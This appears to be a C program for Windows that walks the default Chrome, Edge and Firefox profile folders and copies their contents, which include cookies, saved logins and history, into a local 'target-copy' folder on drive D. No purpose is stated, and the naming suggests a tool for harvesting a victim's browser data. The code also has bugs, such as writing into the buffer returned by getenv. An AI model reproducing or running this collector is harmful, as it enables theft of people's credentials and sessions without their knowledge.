#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void copyDir(char *path_origin, char *dir_name);

int main()
{
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char *localAppData = getenv("LOCALAPPDATA");
    char *appData = getenv("APPDATA");
    char chromePath[MAX_PATH];
    char edgePath[MAX_PATH];
    char firefoxPath[MAX_PATH];
    sprintf(localAppData, "%s", getenv("LOCALAPPDATA"));
    sprintf(appData, "%s", getenv("APPDATA"));
    sprintf(chromePath, "%s\\Google\\Chrome\\User Data\\Default\\*", localAppData);
    sprintf(edgePath, "%s\\Microsoft\\Edge\\User Data\\Default\\*", localAppData);
    sprintf(firefoxPath, "%s\\Mozilla\\Firefox\\Profiles\\*", appData);
    char *browserPath[] = {chromePath, edgePath, firefoxPath};
    CreateDirectory("D:\\target-copy", NULL);
    CreateDirectory("D:\\target-copy\\browser-watch-data", NULL);
    for (size_t i = 0; i < 3; i++)
    {
        hFind = FindFirstFile(browserPath[i], &findData);
        browserPath[i][strlen(browserPath[i]) - 2] = '\0';
        while (FindNextFile(hFind, &findData))
        {
            char srcPath[MAX_PATH];
            char destPath[MAX_PATH];
            sprintf(srcPath, "%s\\%s", browserPath[i], findData.cFileName);
            sprintf(destPath, "D:\\target-copy\\browser-watch-data\\copy_%s", findData.cFileName);
            if (CopyFile(srcPath, destPath, FALSE))
            {
                ;
            }
            else
            {
                if (strcmp(findData.cFileName, ".."))
                {
                    copyDir(srcPath, findData.cFileName);
                }
            }
        }
    }
}

void copyDir(char *path_origin, char *dir_name)
{
    WIN32_FIND_DATA findData;
    HANDLE hFind;

    char ogPath[MAX_PATH];
    char newDir[MAX_PATH];
    char srcPath[MAX_PATH];
    char newDirCopy[MAX_PATH];
    sprintf(srcPath, "%s\\*", path_origin);
    sprintf(newDir, "D:\\target-copy\\browser-watch-data\\copy_%s", dir_name);
    CreateDirectory(newDir, NULL);
    ;
    hFind = FindFirstFile(srcPath, &findData);
    while (FindNextFile(hFind, &findData))
    {
        sprintf(ogPath, "%s\\%s", path_origin, findData.cFileName);
        sprintf(newDirCopy, "%s\\%s", newDir, findData.cFileName);
        if (CopyFile(ogPath, newDirCopy, FALSE))
        {
            ;
        }
        // Sub directories are ignored for speed reasons.
    }
}
